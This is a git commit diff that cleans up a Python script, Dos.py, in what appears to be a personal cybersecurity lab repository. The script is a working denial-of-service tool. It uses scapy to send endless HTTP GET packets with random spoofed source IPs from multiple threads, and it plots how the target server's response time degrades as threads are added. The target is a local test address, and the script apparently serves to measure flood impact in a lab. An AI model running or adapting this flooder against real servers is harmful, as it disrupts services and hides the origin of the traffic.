a748c49cca0c3ed4cbd0a222c694aa18b39d66a3
Or Alush <Or.Alush@solaredge.com>
2023-11-04 17:58:02 +0200

    cleaned Dos.py

--- Cyber_Scripts/Dos.py
+++ Cyber_Scripts/Dos.py
@@ -1,19 +1,14 @@
 import random
-
 from matplotlib.ticker import MultipleLocator
 from scapy.all import *
 from scapy.layers.inet import *
 import time
 import http.client
-from queue import Queue
 import threading
 import matplotlib.pyplot as plt
 
+
 def dos(server_ip, server_port):
-    # Define the source and destination IP addresses and ports
-    # start_src_ip = "10.100.102."
-    # dest_ip = "10.100.102.19"
-    # dest_port = 8000
 
     # Craft an HTTP GET request packet
     tcp_packet = TCP(dport=server_port, sport=12345)  # Use a source port of your choice
@@ -24,19 +19,17 @@ def dos(server_ip, server_port):
     ).format(server_ip)
 
     while True:
-        rand_num1 = int(random.uniform(1, 254))
-        rand_num2 = int(random.uniform(1, 254))
-        rand_num3 = int(random.uniform(1, 254))
-        rand_num4 = int(random.uniform(1, 254))
-        # src_ip = start_src_ip+str(rand_num)
+        rand_num1 = random.randint(1, 254)
+        rand_num2 = random.randint(1, 254)
+        rand_num3 = random.randint(1, 254)
+        rand_num4 = random.randint(1, 254)
         src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
-        # print(src_ip)
         ip_packet = IP(src=src_ip, dst=server_ip)
 
-        packet = ip_packet / tcp_packet / get_request
+        _packet = ip_packet / tcp_packet / get_request
 
         # Send the packet
-        send(packet, verbose=0)
+        send(_packet, verbose=0)
 
 
 def get_response_time(server_ip, server_port, path="/"):
@@ -50,7 +43,7 @@ def get_response_time(server_ip, server_port, path="/"):
         conn.request("GET", path)
 
         # Get the response
-        response = conn.getresponse()
+        response = conn.getresponse()  # used to measure response time of server
 
         # Measure the response time
         response_time = (time.time() - start_time) * 1000  # in milliseconds
@@ -64,12 +57,13 @@ def get_response_time(server_ip, server_port, path="/"):
         print(f"An error occurred: {e}")
         return None
 
+
 def response_time_iterate(server_ip, port, q):
-    iter = 0
+    _iter = 0
     avg_iter = 0
     res_sum = 0
     res_avg = 0
-    while iter < 100:
+    while _iter < 100:
         response_time = get_response_time(server_ip, port)
         if response_time is None:
             print("error")
@@ -81,18 +75,15 @@ def response_time_iterate(server_ip, port, q):
             else:
                 res_avg = res_sum/avg_iter
                 q.put(res_avg)
-                iter += 1
+                _iter += 1
                 avg_iter = 0
                 res_sum = 0
             time.sleep(0.1)
 
-# dos(1, "10.100.102.19", 8000)
-# print(get_response_time("10.100.102.19", 8000))
-
 
 def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_threads=10, samples_for_avg=10):
     # sample iterations
-    iter = 1
+    _iter = 1
 
     # total number of samples averages
     num_of_samples = (1+num_of_threads) * response_avgs_between_threads
@@ -119,7 +110,7 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
     for i in range(num_of_threads):
         dos_threads.append(threading.Thread(target=dos, args=(server_ip, server_port), daemon=True))
 
-    while iter < (num_of_samples+1):
+    while _iter < (num_of_samples + 1):
         try:
             # calculate response times averages
             while avg_iter < samples_for_avg:
@@ -135,17 +126,17 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
             avg_iter = 0
             res_sum = 0
             # append the iteration to the list
-            iter_list.append(iter-1)
+            iter_list.append(_iter - 1)
             # append the response time average to the list
             response_times_list.append(res_avg)
             # print the response time average
             print(f"response time: %.2f" % res_avg)
 
             # starting dos thread at the required time
-            if num_of_samples > iter >= response_avgs_between_threads and iter % response_avgs_between_threads == 0:
-                print(f"\n\n\nadd dos thread number {(iter//10)-1}\n\n\n")
-                dos_threads[(iter // response_avgs_between_threads) - 1].start()
-            iter += 1
+            if num_of_samples > _iter >= response_avgs_between_threads and _iter % response_avgs_between_threads == 0:
+                print(f"\n\n\nadd dos thread number {(_iter // 10) - 1}\n\n\n")
+                dos_threads[(_iter // response_avgs_between_threads) - 1].start()
+            _iter += 1
 
         except KeyboardInterrupt:
             break
@@ -164,17 +155,18 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
     plt.title('Server response time depending on threads')
 
     # Set the x-axis limits to start at 0 and end at 110
-    plt.xlim(0, (num_of_samples))
+    plt.xlim(0, num_of_samples)
 
     # Set tick marks on the x-axis at every 10 units
-    plt.xticks(range(0, (num_of_samples+1), response_avgs_between_threads))
+    plt.xticks(range(0, num_of_samples + 1, response_avgs_between_threads))
 
     # Enable minor ticks at intervals of 0.5 units
     minor_locator = MultipleLocator(1)
     plt.gca().xaxis.set_minor_locator(minor_locator)
 
     # Create custom labels for the major ticks
-    major_tick_locations = range(response_avgs_between_threads, (num_of_threads * response_avgs_between_threads + 1), response_avgs_between_threads)
+    major_tick_locations = range(response_avgs_between_threads, (num_of_threads * response_avgs_between_threads + 1)
+                                 , response_avgs_between_threads)
     major_tick_labels = [f'Th{(loc // response_avgs_between_threads) - 1}' for loc in major_tick_locations]
 
     # Set major tick marks on the x-axis and apply custom labels
@@ -184,9 +176,5 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
 
     return plt
 
-    # plt.show()
-
-
-plot = execute("10.100.102.19", 8000)
-
-plot.show()
+# plot = execute("10.100.102.19", 8000)
+# plot.show()
